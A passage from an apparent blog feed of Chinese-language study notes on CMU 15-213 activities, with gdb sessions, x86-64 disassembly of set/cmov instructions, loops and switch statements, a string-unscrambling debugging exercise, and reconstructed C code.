SIGTRAP, Trace/breakpoint trap.\nmain (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at machine-control/cmp-set.c:43\n43      machine-control/cmp-set.c: No such file or directory.\n</code></pre>\n<p>输入<code>c</code>，提示如下：</p>\n<pre><code>(gdb) c\nContinuing.\n\nBesides &#39;main&#39;, this program defines three functions:\n    &#39;sete&#39;, &#39;seta&#39;, and &#39;setg&#39;.\n\nUse the &#39;disassemble&#39; command on each to see their code.\nThen, as instructed in the handout, use the &#39;call&#39; command\nto call them with various arguments.\n\nWhen you have answered all the questions in this section of\nthe handout, use the &#39;c&#39; command to go on.\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\nmain (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at machine-control/cmp-set.c:45\n45      in machine-control/cmp-set.c\n</code></pre>\n<p>分别使用<code>disassemble</code>命令来查看<code>sete</code>,<code>seta</code>和<code>setg</code>三条指令，使用<code>call</code>命令来调用他们，完成任务后使用<code>c</code>来继续。</p>\n<p><code>sete</code>反汇编结果如下：</p>\n<pre><code class=\"asm\">(gdb) disassemble sete\nDump of assembler code for function sete:\n   0x0000000000401178 &lt;+0&gt;:     cmp    %si,%di\n   0x000000000040117b &lt;+3&gt;:     sete   %al\n   0x000000000040117e &lt;+6&gt;:     movzbl %al,%eax\n   0x0000000000401181 &lt;+9&gt;:     retq\nEnd of assembler dump.\n</code></pre>\n<p>在<code>sete</code>中，<code>%si</code>和<code>%di</code>包含参数，<code>%eax</code>中包含返回值。该函数的 C 代码还原如下：</p>\n<blockquote>\n<p>这里到底是<code>uint16_t</code>还是<code>int16_t</code>?有区别吗?</p>\n</blockquote>\n<pre><code class=\"c\">#include &lt;stdint.h&gt;\nsete(uint16_t si, uint16_t di)\n&#123;\n    return si == di;\n&#125;\n</code></pre>\n<p><code>seta</code>函数的反汇编结果如下：</p>\n<pre><code>(gdb) disassemble seta\nDump of assembler code for function seta:\n   0x000000000040118c &lt;+0&gt;:     cmp    %si,%di\n   0x000000000040118f &lt;+3&gt;:     seta   %al\n   0x0000000000401192 &lt;+6&gt;:     movzbl %al,%eax\n   0x0000000000401195 &lt;+9&gt;:     retq\nEnd of assembler dump.\n</code></pre>\n<p><code>seta</code>比较的是无符号数，其 C 语言代码如下：</p>\n<pre><code class=\"c\">#include &lt;stdint.h&gt;\nsete(uint16_t si, uint16_t di)\n&#123;\n    return di &gt; si;\n&#125;\n</code></pre>\n<p><code>setg</code>函数的反汇编结果如下：</p>\n<pre><code>(gdb) disassemble setg\nDump of assembler code for function setg:\n   0x0000000000401182 &lt;+0&gt;:     cmp    %si,%di\n   0x0000000000401185 &lt;+3&gt;:     setg   %al\n   0x0000000000401188 &lt;+6&gt;:     movzbl %al,%eax\n   0x000000000040118b &lt;+9&gt;:     retq\nEnd of assembler dump.\n</code></pre>\n<p><code>setg</code>比较的是有符号数，其 C 语言代码如下：</p>\n<pre><code class=\"c\">#include &lt;stdint.h&gt;\nsete(int16_t si, int16_t di)\n&#123;\n    return di &gt; si;\n&#125;\n</code></pre>\n<p>注意<code>setg</code>和<code>seta</code>有区别。<br>对不同组别的值分别调用<code>sete</code>,<code>seta</code>和<code>setg</code>，其值如下：</p>\n<table>\n<thead>\n<tr>\n<th>arg1</th>\n<th>arg2</th>\n<th><code>sete</code></th>\n<th><code>setg</code></th>\n<th><code>seta</code></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>0</td>\n<td>0</td>\n<td>1</td>\n<td>-</td>\n<td>-</td>\n</tr>\n<tr>\n<td>0</td>\n<td>1</td>\n<td>-</td>\n<td>-</td>\n<td>-</td>\n</tr>\n<tr>\n<td>1</td>\n<td>0</td>\n<td>-</td>\n<td>1</td>\n<td>1</td>\n</tr>\n<tr>\n<td>-1</td>\n<td>0</td>\n<td>-</td>\n<td>-</td>\n<td>1</td>\n</tr>\n<tr>\n<td>0</td>\n<td>-1</td>\n<td>-</td>\n<td>1</td>\n<td>-</td>\n</tr>\n<tr>\n<td>32768</td>\n<td>32767</td>\n<td>-</td>\n<td>-</td>\n<td>1</td>\n</tr>\n<tr>\n<td>32767</td>\n<td>32768</td>\n<td>-</td>\n<td>1</td>\n<td>-</td>\n</tr>\n<tr>\n<td>32768</td>\n<td>32768</td>\n<td>1</td>\n<td>-</td>\n<td>-</td>\n</tr>\n<tr>\n<td>32768</td>\n<td>−32768</td>\n<td>1</td>\n<td>-</td>\n<td>-</td>\n</tr>\n<tr>\n<td>−32768</td>\n<td>32768</td>\n<td>1</td>\n<td>-</td>\n<td>-</td>\n</tr>\n<tr>\n<td>−32768</td>\n<td>−32768</td>\n<td>1</td>\n<td>-</td>\n<td>-</td>\n</tr>\n</tbody></table>\n<p><strong>从<code>-1</code>和<code>0</code>的两行比较可以看得出来，<code>seta</code>是先将负数转化为<code>unsigned</code>类型的数，然后再相减。当数字的值超过<code>signed</code>类型范围后，会转化为负数，然后再比较。此处<code>32768</code>在进行有符号数比较时都被转化为<code>-32768</code>了</strong></p>\n<h2 id=\"Tests-and-Conditional-Move-Instructions\"><a href=\"#Tests-and-Conditional-Move-Instructions\" class=\"headerlink\" title=\"Tests and Conditional Move Instructions\"></a>Tests and Conditional Move Instructions</h2><p>输入下列指令开启当前 Activity:</p>\n<pre><code>$ gdb ./test-cmov\n(gdb) r\n</code></pre>\n<p>得到如下提示：</p>\n<pre><code>(gdb) r\nStarting program: /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/machine-control/test-cmov\n\nThis program should be run inside GDB:\n  $ gdb /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/machine-control/test-cmov\n  (gdb) r\nIf you didn&#39;t run it that way, it will now crash.\nOtherwise, you will get the (gdb) prompt back.\n\nType &#39;c&#39; (short for &#39;continue&#39;) at the (gdb) prompt.\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\nmain (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at machine-control/test-cmov.c:43\n43      machine-control/test-cmov.c: No such file or directory.\n(gdb)\n</code></pre>\n<p>输入<code>c</code>继续，得到如下提示：</p>\n<pre><code>(gdb) c\nContinuing.\n\nBesides &#39;main&#39;, this program defines three functions:\n    &#39;cmove&#39;, &#39;cmovs&#39;, and &#39;cmovc&#39;.\n\nUse the &#39;disassemble&#39; command on each to see their code.\nThen, as instructed in the handout, use the &#39;call&#39; command\nto call them with various arguments.\n\nWhen you have answered all the questions in this section of\nthe handout, use the &#39;c&#39; command to go on.\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\nmain (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at machine-control/test-cmov.c:45\n45      in machine-control/test-cmov.c\n</code></pre>\n<p>对<code>cmove</code>，<code>cmovs</code>和<code>cmovc</code>三个函数分别进行反汇编可以得到如下结果：</p>\n<pre><code class=\"asm\">(gdb) disassemble cmove\nDump of assembler code for function cmove:\n   0x00000000004005b3 &lt;+0&gt;:     mov    $0x0,%eax\n   0x00000000004005b8 &lt;+5&gt;:     test   %di,%di\n   0x00000000004005bb &lt;+8&gt;:     cmove  %esi,%eax\n   0x00000000004005be &lt;+11&gt;:    retq\nEnd of assembler dump.\n(gdb) disassemble cmovs\nDump of assembler code for function cmovs:\n   0x00000000004005bf &lt;+0&gt;:     mov    $0x0,%eax\n   0x00000000004005c4 &lt;+5&gt;:     test   %di,%di\n   0x00000000004005c7 &lt;+8&gt;:     cmovs  %esi,%eax\n   0x00000000004005ca &lt;+11&gt;:    retq\nEnd of assembler dump.\n(gdb) disassemble cmovc\nDump of assembler code for function cmovc:\n   0x00000000004005cb &lt;+0&gt;:     mov    $0x0,%eax\n   0x00000000004005d0 &lt;+5&gt;:     test   %di,%di\n   0x00000000004005d3 &lt;+8&gt;:     cmovb  %esi,%eax\n   0x00000000004005d6 &lt;+11&gt;:    retq\nEnd of assembler dump.\n</code></pre>\n<p>首先我们需要了解<code>cmov</code>三条指令分别是做什么的，可以参见<img data-src=\"/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Machine%20control%20activity/mov.jpg\" alt=\"这张图\"></p>\n<p>其中<code>cmove</code>是当<code>ZF = 1</code>时为 1（相等或等于 0），<code>cmovs</code>是当<code>SF = 1</code>时为 1（为负数），<code>cmovb</code>时当<code>CF = 1</code>时为 1（低于，无符号<code>&lt;</code>）。上述三个函数的两个传入参数是<code>%di</code>和<code>%esi</code>。若<code>%di</code>满足条件，则将返回值设置为<code>%esi</code>。否则<code>%eax = 0</code>。由此可得，<code>arg1</code>是<code>%di</code>,<code>arg2</code>是<code>%esi</code>。</p>\n<p>Q1: 为什么<code>cmovc</code>中使用的是<code>cmovb</code>指令？因为<code>cmovc</code>指令的意义是<code>move if carry</code><br>Q2: <code>test</code>指令使用的什么寄存器？使用的是<code>%di</code>，2 个字节。</p>\n<p>接下来填表：</p>\n<table>\n<thead>\n<tr>\n<th>Arg 1(<code>%di</code>)</th>\n<th>Arg 2(<code>%esi</code>)</th>\n<th>cmove(相等&#x2F;0)</th>\n<th>cmovs(负数)</th>\n<th>cmovb(无符号<code>&lt;</code>)</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>0</td>\n<td>0</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>0</td>\n<td>1</td>\n<td>1</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>0</td>\n<td>2</td>\n<td>2</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>1</td>\n<td>0</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>1</td>\n<td>1</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>1</td>\n<td>2</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>−1</td>\n<td>0</td>\n<td></td>\n<td>0</td>\n<td></td>\n</tr>\n<tr>\n<td>−1</td>\n<td>1</td>\n<td></td>\n<td>1</td>\n<td></td>\n</tr>\n<tr>\n<td>−1</td>\n<td>2</td>\n<td></td>\n<td>2</td>\n<td></td>\n</tr>\n<tr>\n<td>32767</td>\n<td>1</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>32768</td>\n<td>1</td>\n<td></td>\n<td>1</td>\n<td></td>\n</tr>\n</tbody></table>\n<p>未填写部分全为 0。从上表我们可以看到<code>cmove</code>只有在<code>%di</code>等于 0 时，才会等于<code>%esi</code>。而<code>%esi</code>只有在为<code>%di</code>负数时，才会等于<code>%esi</code>（此外，如果<code>%di</code>的值超过了有符号数的上界，如<code>32768</code>，那么其会被转化为<code>-32768</code>，也就是最后一行，那么<code>%di</code>也是负数，因此<code>%eax</code>被赋值为 1）。此外，<code>cmovb</code>一直等于 0，因为这里没有无符号的小于。</p>\n<h2 id=\"Loops\"><a href=\"#Loops\" class=\"headerlink\" title=\"Loops\"></a>Loops</h2><p>按照 handout 提示输入<code>objdump -d loops.o</code>，得到如下结果：</p>\n<pre><code class=\"asm\">\nloops.o:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n0000000000000000 &lt;forLoop&gt;:\n   0:   ba 00 00 00 00          mov    $0x0,%edx\n   5:   b8 00 00 00 00          mov    $0x0,%eax\n   a:   39 f0                   cmp    %esi,%eax\n   c:   7d 0b                   jge    19 &lt;forLoop+0x19&gt;\n   e:   48 63 c8                movslq %eax,%rcx\n  11:   03 14 8f                add    (%rdi,%rcx,4),%edx\n  14:   83 c0 01                add    $0x1,%eax\n  17:   eb f1                   jmp    a &lt;forLoop+0xa&gt;\n  19:   89 d0                   mov    %edx,%eax\n  1b:   c3                      retq\n</code></pre>\n<p>该汇编代码的 C 语言形式如下：</p>\n<pre><code class=\"c\">\nint forLoop(int* x, int len) &#123;\n   int ret = 0;\n   for (i = 0; i &lt; len; i++) &#123;\n      ret += x[i];\n   &#125;\n   return ret;\n&#125;\n</code></pre>\n<pre><code>000000000000001c &lt;whileLoop&gt;:\n  1c:   ba 00 00 00 00          mov    $0x0,%edx\n  21:   b8 00 00 00 00          mov    $0x0,%eax\n  26:   39 f0                   cmp    %esi,%eax\n  28:   7d 0b                   jge    35 &lt;whileLoop+0x19&gt;\n  2a:   48 63 c8                movslq %eax,%rcx\n  2d:   03 14 8f                add    (%rdi,%rcx,4),%edx\n  30:   83 c0 01                add    $0x1,%eax\n  33:   eb f1                   jmp    26 &lt;whileLoop+0xa&gt;\n  35:   89 d0                   mov    %edx,%eax\n  37:   c3                      retq\n</code></pre>\n<p>该循环的 C 形式代码如下：</p>\n<pre><code class=\"c\">int whileLoop (int* x, int len) &#123;\n   int ret = 0;\n   while (i &lt; len) &#123;\n      ret += x[i];\n      i++;\n   &#125;\n   return ret;\n&#125;\n</code></pre>\n<pre><code>0000000000000038 &lt;doWhileLoop&gt;:\n  38:   ba 00 00 00 00          mov    $0x0,%edx\n  3d:   b8 00 00 00 00          mov    $0x0,%eax\n  42:   48 63 c8                movslq %eax,%rcx\n  45:   03 14 8f                add    (%rdi,%rcx,4),%edx\n  48:   83 c0 01                add    $0x1,%eax\n  4b:   39 f0                   cmp    %esi,%eax\n  4d:   7c f3                   jl     42 &lt;doWhileLoop+0xa&gt;\n  4f:   89 d0                   mov    %edx,%eax\n  51:   c3                      retq\n</code></pre>\n<p><code>doWhileLoop</code>的 C 循环代码如下：</p>\n<pre><code class=\"c\">int doWhileLoop (int* x, int len) &#123;\n   int ret = 0;\n   int i = 0;\n   do &#123;\n      ret += x[i];\n      i++;\n   &#125; while (i &lt; len);\n   return ret;\n&#125;\n</code></pre>\n<h2 id=\"Switch-Statements\"><a href=\"#Switch-Statements\" class=\"headerlink\" title=\"Switch Statements\"></a>Switch Statements</h2><p><code>switch</code>语句汇编代码如下：</p>\n<pre><code class=\"asm\">switcher:\n   cmpq $7 , %rdi\n   ja .L2\n   jmp *.L4(, %rdi , 8)\n.L7:\n   xorq $15 , %rsi\n   movq %rsi , %rdx\n.L3:\n   leaq 112(% rdx), %rdi\n   jmp .L6\n.L5:\n   leaq (%rdx , %rsi), %rdi\n   salq $2 , %rdi\n   jmp .L6\n.L2:\n   movq %rsi , %rdi\n.L6:\n   movq %rdi , (% rcx)\n   ret\n.section .rodata\n.L4:\n   .quad .L3 ;;x = 0 -&gt; rdi = rdx + 112; break;\n   .quad .L2 ;;x = 1 -&gt; default\n   .quad .L5 ;;x = 2 -&gt; rdi = rdx + rsi; rdi = rdi &lt;&lt; 2; break;\n   .quad .L2 ;;x = 3 -&gt; default\n   .quad .L6 ;;x = 4 -&gt; *rcx = rdi; break;\n   .quad .L7 ;;x = 5 -&gt; rsi = rsi ^ 15; rdx = rsi;\n   .quad .L2 ;;x = 6 -&gt; default\n   .quad .L5 ;;x = 7 -&gt; rdi = rdx + rsi; rdi = rdi &lt;&lt; 2; break;\n</code></pre>\n<p>其还原的 C 语句代码如下：</p>\n<pre><code class=\"c\">// 1, 3, 6没有；只有 0，2，4，5，7\n// %rdi = a and val , %rsi = b, %rdx = c, %rcx = dest\nvoid switcher(long a, long b, long c, long *dest) &#123;\n   long val;\n   switch (a) &#123;\n      case 5:\n         c = b ^ 15;\n      case 0:\n         val = c + 112;\n         break;\n      case 2:\n      case 7:\n         val = (c + b) &lt;&lt; 2;\n         break;\n      case 4:\n         val = a;\n         break;\n      default:\n         val = b;\n   &#125;\n   *dest = val;\n&#125;\n</code></pre>\n<p>注意<code>case 4</code>中，按理来说<code>.L4</code>时<code>val = a</code>而不是<code>*dest = val</code>（汇编来看）。这里我们再将 C 编译成汇编语句时，对 C 语言的语句做了一个优化，将<code>*dest = val</code>转化为两句：</p>\n<pre><code class=\"c\">val = a;\n*dest = val;\n</code></pre>\n<p>这样转化的原因<strong>是在 C 语言中<code>*dest = val</code>是所有语句共同需要执行的部分，因此我们将它放在<code>switch</code>语句之外，而将<code>val = a</code>放在语句内</strong>。这样语句前后意思是一样的，而<code>switch</code>语句的目的也达到了。而汇编层面做了优化，将<code>*dest = val</code>直接放在<code>.L6</code>处，其他语句执行完后跳转到<code>.L6</code>。</p>\n",
            "tags": []
        },
        {
            "id": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Bomb%20lab%20activity/",
            "url": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Bomb%20lab%20activity/",
            "title": "15-213 Bomb lab Activity 记录",
            "date_published": "2024-02-29T09:11:59.000Z",
            "content_html": "<h2 id=\"Part-I\"><a href=\"#Part-I\" class=\"headerlink\" title=\"Part I\"></a>Part I</h2><p>输入如下命令：</p>\n<pre><code>$ gcc -o phase1 -g -std=c99 phase1.c\n$ gdb ./phase1\n</code></pre>\n<p>按照 handout 依次输入命令并观察结果。</p>\n<h3 id=\"打断点\"><a href=\"#打断点\" class=\"headerlink\" title=\"打断点\"></a>打断点</h3><pre><code>(gdb) break main\nBreakpoint 1 at 0x13b2: file phase1.c, line 54.\n(gdb) break unscramble\nBreakpoint 2 at 0x1308: file phase1.c, line 39.\n(gdb) break reverse\nBreakpoint 3 at 0x1274: file phase1.c, line 30.\n(gdb) break toggleCase\nBreakpoint 4 at 0x11e7: file phase1.c, line 18.\n(gdb) info break\nNum     Type           Disp Enb Address            What\n1       breakpoint     keep y   0x00000000000013b2 in main at phase1.c:54\n2       breakpoint     keep y   0x0000000000001308 in unscramble at phase1.c:39\n3       breakpoint     keep y   0x0000000000001274 in reverse at phase1.c:30\n4       breakpoint     keep y   0x00000000000011e7 in toggleCase at phase1.c:18\n</code></pre>\n<h3 id=\"运行程序-打印值\"><a href=\"#运行程序-打印值\" class=\"headerlink\" title=\"运行程序 &amp; 打印值\"></a>运行程序 &amp; 打印值</h3><pre><code>(gdb) run\nStarting program: /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/lab2_handout/phase1\n\nBreakpoint 1, main () at phase1.c:54\n54      int main () &#123;\n(gdb) n\n55          word_t *secret_msg = (word_t *) calloc(1, sizeof(word_t));\n(gdb) n\n56          secret_msg-&gt;str = (char *) calloc(length, sizeof(char));\n(gdb) print *(word_t*)secret_msg\n$1 = &#123;str = 0x0, len = 0&#125;\n(gdb) next\n57          strncpy(secret_msg-&gt;str, &quot;!312 Av XPHy QBBt&quot;, length);;\n(gdb) print *(word_t*)secret_msg\n$2 = &#123;str = 0x5555555592c0 &quot;&quot;, len = 0&#125;\n</code></pre>\n<h3 id=\"单步调试-watchpoint\"><a href=\"#单步调试-watchpoint\" class=\"headerlink\" title=\"单步调试 &amp; watchpoint\"></a>单步调试 &amp; watchpoint</h3><pre><code>Breakpoint 2, unscramble (msg=0x555555555480 &lt;__libc_csu_init&gt;) at phase1.c:39\n39      void unscramble (word_t *msg) &#123;\n(gdb) step\n41          char chng = 13;\n(gdb) next\n42          for (int i = 0; i &lt; msg-&gt;len; i++) &#123;\n(gdb) next\n43              ltr = msg-&gt;str[i];\n(gdb) print(ltr)\n$3 = 85 &#39;U&#39;\n(gdb) print isAlpha(ltr)\n$4 = true\n(gdb) watch ltr\nHardware watchpoint 5: ltr\n(gdb) c\nContinuing.\n\nHardware watchpoint 5: ltr\n\nOld value = 85 &#39;U&#39;\nNew value = 33 &#39;!&#39;\nunscramble (msg=0x5555555592a0) at phase1.c:44\n44              if (isAlpha(ltr)) &#123;\n(gdb) step\nisAlpha (ltr=85 &#39;U&#39;) at phase1.c:13\n13      bool isAlpha (char ltr) &#123;\n(gdb) backtrace\n#0  isAlpha (ltr=85 &#39;U&#39;) at phase1.c:13\n#1  0x0000555555555345 in unscramble (msg=0x5555555592a0) at phase1.c:44\n#2  0x0000555555555429 in main () at phase1.c:60\n</code></pre>\n<h3 id=\"3-Questions\"><a href=\"#3-Questions\" class=\"headerlink\" title=\"3 Questions\"></a>3 Questions</h3><ol>\n<li>What does <code>unscramble(word_t *msg)</code> do? And how?<br>将<code>secret_msg</code>指向的结构体中的<code>!312 Av XPHy QBBt</code>替换成了<code>!312 Ni KCUl DOOg</code>。<br><code>unscramble</code>的作用是：判断<code>msg_str</code>当前的字符，如果<code>M &lt; ltr &lt;= Z</code>，就将其字符值减去 13。否则加上 13。</li>\n<li>What does <code>reverse(word_t *msg)</code> do? And how?<br>将<code>secret_msg</code>指向的结构体中的<code>!312 Ni KCUl DOOg</code>替换成了<code>gOOD lUCK iN 213!</code>。该函数反转字符串。</li>\n<li>What does <code>toggleCase(word_t *msg)</code> do? And how?<br>将<code>secret_msg</code>指向的结构体中的<code>gOOD lUCK iN 213!</code>替换成了<code>Good Luck In 213!</code>。该函数反转字符串大小写。</li>\n</ol>\n<h2 id=\"Part-II\"><a href=\"#Part-II\" class=\"headerlink\" title=\"Part II\"></a>Part II</h2><p>输入<code>gcc -std=c99 -o phase2 -g phase2.c</code>编译生成<code>phase2</code>，对其利用<code>gdb</code>进行排错发现<code>S-&gt;top-&gt;len</code>为 0，导致浮点数相除时发生错误。我们进行如下修改：</p>\n<ol>\n<li>在初始化栈的时候让栈顶的长度为 0</li>\n<li><code>push</code>新结点的时候让结点的<code>len</code>为栈顶结点的长度加 1，然后让栈顶指向结点</li>\n<li><code>pop</code>时结点弹出，栈顶指向的新结点的长度值为弹出结点长度减 1</li>\n</ol>\n",
            "tags": []
        },
        {
            "id": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/gdb%20&%20asm%20activity/",
            "url": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/gdb%20&%20asm%20activity/",
            "title": "15-213 GDB and Assembly Activity 记录",
            "date_published": "2024-02-29T09:10:30.000Z",
            "content_html": "<h2 id=\"Activity-1\"><a href=\"#Activity-1\" class=\"headerlink\" title=\"Activity 1\"></a>Activity 1</h2><p>运行</p>\n<pre><code class=\"bash\">gdb ./act1\n(gdb) r 1\n</code></pre>\n<p>出现如下提示:</p>\n<pre><code>If you have questions about the commands, type (gdb) help &lt;command&gt;\nNow type (gdb) info registers\nThis will display all of the integer registers.\nRegisters are basically the only local &quot;variables&quot; in assembly.\nThey are not located in memory, but instead directly within the CPU core.\n  As such, they have no memory addresses and are referred to by name.\nAlthough historically each register had a special purpose, now only %rsp does.\n  It points to the top of the stack.\nLook over the other registers: do any of them have familiar values, such as 1?\nQ.  Given the information that GDB just stopped the program at the beginning\n    of a function taking one or more arguments, write down your best guess at the\n    purposes of the %rsp, %rdi, and %rax registers.\n\nDuring this activity, gdb will print ... SIGTRAP ....  This is expected.\nIt indicates that the program, such as act1, triggered a breakpoint.\nWhen you are finished looking at the registers, type r 2 &lt;enter&gt;\nGDB may ask you if you want to start the program from the beginning (y or n) y\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n</code></pre>\n<p>根据提示，输入<code>info registers</code>后，显示值如下：</p>\n<pre><code class=\"bash\">(gdb) info registers\nrax            0x4f                79\nrbx            0x0                 0\nrcx            0x7ffff7ec3297      140737352839831\nrdx            0x0                 0\nrsi            0x6042a0            6308512\nrdi            0x1                 1\nrbp            0x0                 0x0\nrsp            0x7fffffffde40      0x7fffffffde40\nr8             0x4f                79\nr9             0x39                57\nr10            0x400397            4195223\nr11            0x246               582\nr12            0x400590            4195728\nr13            0x7fffffffdf40      140737488346944\nr14            0x0                 0\nr15            0x0                 0\nrip            0x40077f            0x40077f &lt;printStep2+191&gt;\neflags         0x246               [ PF ZF IF ]\ncs             0x33                51\nss             0x2b                43\nds             0x0                 0\nes             0x0                 0\n--Type &lt;RET&gt; for more, q to quit, c to continue without paging--\nfs             0x0                 0\ngs             0x0                 0\n</code></pre>\n<p>该处<code>%rdi</code>寄存器的值为 1，<code>%rsp</code>的值为<code>0x7fffffffde40</code>,<code>%rax</code>的值为<code>79</code>。<code>%rsp</code>寄存器中存储的值应当是地址，<code>%rax</code>中存储返回值，<code>%rdi</code>中存储传入参数。</p>\n<p>接下来输入<code>r 2</code>。提示信息如下：</p>\n<pre><code>(gdb) r 2\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/gdb-and-assembly/act1 2\nLet&#39;s look at some assembly and registers.\nThere are two styles of assembly printing: AT&amp;T and Intel\nAT&amp;T prints OP SRC, DEST, while Intel prints OP DEST, SRC\nOP - opcode or instruction such as mov, ret, add, etc\nSRC - source or input, instructions may have 0, 1, or 2 sources\nDEST - destination, update this location, instructions may have 0 or 1\n        destinations\nLinux is based on Unix which was originally developed at Bell Labs, so GNU tools\ndefault to AT&amp;T style printing.\nAlso, sometimes a DEST is also a SRC, kind of like x += 5\nType (gdb) c\nThis will continue execution, please do so after each question.\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n</code></pre>\n<p>该提示介绍了一下<code>AT &amp; T</code>格式和<code>intel</code>格式的区别，主要是<code>src</code>和<code>dest</code>的位置不一样。按照提示输入<code>c</code>查看：</p>\n<pre><code>(gdb) c\nContinuing.\nYou will commonly dissassemble a function.  There will be a header and footer.\nMost of the output will be 0x....... &lt;+0&gt;:  OP SRC, DEST\nThis indicates that at address 0x..., which is 0 bytes from the start of the\nfunction, there is an instruction OP with SRC and DEST as shown.\nType (gdb) disassemble squareInt\nMOV is a common and powerful instruction.  It can &quot;move&quot; (actually, copy) values\nbetween registers, load from memory, or store to memory.\n   In this case, %edi holds the argument to the function and %eax its return value.\nQ.  Fill in the blank in the pseudo C code for this function.\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n</code></pre>\n<p>输入<code>disassemble squareInt</code>，得到如下结果：</p>\n<pre><code class=\"asm\">(gdb) disassemble squareInt\nDump of assembler code for function squareInt:\n   0x00000000004009c3 &lt;+0&gt;:     mov    %edi,%eax\n   0x00000000004009c5 &lt;+2&gt;:     imul   %edi,%eax\n   0x00000000004009c8 &lt;+5&gt;:     retq\nEnd of assembler dump.\n</code></pre>\n<p>提示说<code>%edi holds the argument to the function and %eax its return value</code>，那么还原<code>squareInt</code>函数如下：</p>\n<pre><code class=\"c\">// x in %edi, return value in %eax\nint squareInt(int x)\n&#123;\n    return x * x;\n&#125;\n</code></pre>\n<p>输入<code>c</code>，提示</p>\n<pre><code>(gdb) c\nContinuing.\nType (gdb) disassemble squareLInt  (Note the L before Int)\nQ.  How do the names of the registers differ between the functions?\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n</code></pre>\n<p>按照提示输入<code>disassemble squareLInt</code>，看看<code>Q.  How do the names of the registers differ between the functions?</code>，结果如下：</p>\n<pre><code class=\"asm\">Dump of assembler code for function squareLInt:\n   0x00000000004009c9 &lt;+0&gt;:     mov    %rdi,%rax\n   0x00000000004009cc &lt;+3&gt;:     imul   %rdi,%rax\n   0x00000000004009d0 &lt;+7&gt;:     retq\nEnd of assembler dump.\n</code></pre>\n<p>可以看到此处使用的是<code>%rdi</code>和<code>%rax</code>。<code>%rdi</code>和<code>%rax</code>是 64 位，而<code>%edi</code>和<code>%eax</code>是 32 位。因为前面用的是<code>int</code>，此处可能用的是<code>long</code>。<code>int</code>类型是 4 个字节，32 位，存储在<code>%eax</code>和<code>%edi</code>中。而<code>long</code>类型是 64 位，可以存储在<code>%rdi</code>和<code>%rax</code>中。</p>\n<p>继续输入<code>c</code>，提示如下：</p>\n<pre><code>(gdb) c\nContinuing.\nsquareLInt used long ints, hence it accessed %rdi, which is 64 bits.\nsquareInt used ints, hence it accessed %edi which is the lower 32 bits of %rdi\nType (gdb) disassemble squareFloat\nQ.  Did squareFloat use the same registers from before?\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n</code></pre>\n<p>输入<code>diassemble squareFloat</code>看看，结果如下:</p>\n<pre><code class=\"asm\">(gdb) disassemble squareFloat\nDump of assembler code for function squareFloat:\n   0x00000000004009d1 &lt;+0&gt;:     mulss  %xmm0,%xmm0\n   0x00000000004009d5 &lt;+4&gt;:     retq\nEnd of assembler dump.\n</code></pre>\n<p>浮点数和之前使用的不是同一套寄存器。继续输入<code>c</code>，可以看到程序退出。按照课程提示，输入<code>r 3</code>，提示如下：</p>\n<pre><code>Starting program: /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/gdb-and-assembly/act1 3\nWe are going to look at how to access memory.\nWe already saw the mov instruction between registers.  Now we will load and\nstore.  When a register is in (), then it is serving as a memory location.\nWhile mov is powerful, we cannot directly mov (%rax), (%rbx).  The ISA requires\na register to be used.\nPlease disassemble function: whatIsThis\nQ.  Knowing that %rdi is the first argument and %rsi is the second, what do\n    you think the function is doing?\nAfter you have an answer, continue execution.  The following code will loop, as\nWe conclude activity 1.  When you are finished, please exit (q &lt;enter&gt;) and run act2.\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n0x0000000000400918 in runStep4 ()\n</code></pre>\n<p>这部分让我们掌握<code>load &amp; store</code>指令，输入<code>disassemble whatIsThis</code>，可得如下结果：</p>\n<pre><code>(gdb) disassemble whatIsThis\nDump of assembler code for function 